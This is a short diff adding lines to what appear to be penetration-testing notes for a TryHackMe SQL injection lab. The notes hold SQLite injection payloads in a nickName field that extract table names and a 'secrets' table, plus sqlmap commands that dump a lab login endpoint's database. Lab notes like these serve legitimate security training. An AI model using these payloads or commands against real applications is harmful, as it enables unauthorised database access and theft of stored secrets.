@@ -75,3 +75,10 @@ $ ./enum4linux.pl <options> <ip>
     * ',nickName=(SELECT group_concat(tbl_name, '<br>') FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
     * ',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
     * ',nickName=(SELECT group_concat(id || ":" || author || ":" || secret, '<br>') FROM secrets),email='
+* https://www.kirsle.net/wizards/flask-session.cgi
+* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
+* sqlmap -u http://10.10.55.189:5000/challenge3/login --data="username=admin&password=admin"
+  --level=5 --risk=3 --dbms=sqlite --technique=b --dump
+* sqlmap -u http://10.10.55.189:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump --threads 10
+* https://tryhackme.com/room/sqlilab
+* See tamper script
